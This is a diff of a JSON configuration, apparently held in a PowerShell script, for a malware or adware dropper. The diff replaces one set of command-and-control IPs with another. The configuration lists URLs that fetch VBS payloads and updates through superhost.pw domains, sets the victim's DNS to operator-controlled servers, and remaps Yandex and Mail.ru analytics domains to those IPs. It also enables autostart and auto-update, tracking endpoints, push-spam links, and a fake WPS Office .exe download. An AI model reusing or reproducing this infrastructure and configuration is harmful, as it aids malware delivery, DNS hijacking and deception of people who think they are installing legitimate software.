@@ -1,31 +1,31 @@
 $server = '{
-    "disableVirus":  true,
+    "disableVirus":  false,
     "dnSponsor":  [
                       {
-                          "enabled":  true,
+                          "enabled":  false,
                           "id":  "ufiler.biz",
-                          "url":  "https://ufiler-pro2.ru/download/3974/?file={dn_url}\u0026poster=https://website-prod.cache.wpscdn.com/img/wps-office-free-all-in-one-office-suite.d880717.png\u0026size=10 ??.\u0026description=??????????????????? ???????? ????? ?? ????? ?????????\u0026theme=software"
+                          "url":  null
                       }
                   ],
     "phpTemplateFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\dn.php",
-    "phpTemplateSponsorFile":  "C:\\inetpub\\wwwroot\\php\\.\\download.php",
-    "htmlTemplateSponsorFile":  "C:\\inetpub\\wwwroot\\php\\.\\download.html",
+    "phpTemplateSponsorFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\.\\download.php",
+    "htmlTemplateSponsorFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\.\\download.html",
     "UpdateFile":  null,
-    "server":  "185.247.141.76",
+    "server":  "109.248.201.219",
     "strahServer":  null,
-    "dnVbsLinkShort":  "185.247.141.76/default/Rs44ZenK5W/none/GetVbs",
-    "dnVbsLink":  "http://0.superhost.pw/185.247.141.76/default/JW5EnadrbM/none/GetVbs",
-    "phpVbsLinkShort":  "185.247.141.76/default/GetVbsPhp",
-    "dnLightVbsLinkShort":  "185.247.141.76/default/cuiK9Epnb4/none/GetLightVbs",
-    "dnLightVbsLink":  "http://0.superhost.pw/185.247.141.76/default/cFlqUOgISu/none/GetLightVbs",
-    "phpLightVbsLinkShort":  "185.247.141.76/default/GetLightVbsPhp",
-    "updateUrl":  "http://0.superhost.pw/185.247.141.76/update",
-    "primaryDns":  "185.247.141.78",
-    "secondaryDns":  "185.247.141.51",
+    "dnVbsLinkShort":  "109.248.201.219/default/YA7xrAIefy/none/GetVbs",
+    "dnVbsLink":  "http://1.superhost.pw/109.248.201.219/default/RcJEGr2Fyf/none/GetVbs",
+    "phpVbsLinkShort":  "109.248.201.219/default/GetVbsPhp",
+    "dnLightVbsLinkShort":  "109.248.201.219/default/gODUvnUkO4/none/GetLightVbs",
+    "dnLightVbsLink":  "http://1.superhost.pw/109.248.201.219/default/mhtKD3Pk44/none/GetLightVbs",
+    "phpLightVbsLinkShort":  "109.248.201.219/default/GetLightVbsPhp",
+    "updateUrl":  "http://1.superhost.pw/109.248.201.219/update",
+    "primaryDns":  "109.248.201.226",
+    "secondaryDns":  "109.248.201.224",
     "track":  true,
-    "trackSerie":  "wps-office",
-    "trackDesktop":  true,
-    "trackUrl":  "http://0.superhost.pw/185.247.141.76/upsert",
+    "trackSerie":  "serie1",
+    "trackDesktop":  false,
+    "trackUrl":  "http://1.superhost.pw/109.248.201.219/upsert",
     "autoStart":  true,
     "autoUpdate":  true,
     "domains":  [
@@ -36,18 +36,17 @@ $server = '{
                     "counter.yadro.ru"
                 ],
     "ipDomains":  {
-                      "185.247.141.78":  "mc.yandex.ru",
-                      "185.247.141.51":  "mc.yandex.com",
-                      "185.247.141.50":  "t.mail.ru",
-                      "185.247.141.48":  "ad.mail.ru",
-                      "185.247.141.46":  "counter.yadro.ru"
+                      "109.248.201.226":  "mc.yandex.ru",
+                      "109.248.201.224":  "mc.yandex.com",
+                      "109.248.201.223":  "t.mail.ru",
+                      "109.248.201.222":  "ad.mail.ru",
+                      "109.248.201.220":  "counter.yadro.ru"
                   },
     "pushes":  [
-                   "https://pushbaza.space/go/hfstkmtege5dcmbug4za",
-                   "https://pushbaza.space/go/ge4dknzyge5dcmbugq3a"
+
                ],
     "startDownloads":  [
-                           "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
+
                        ],
     "startUrls":  [
 
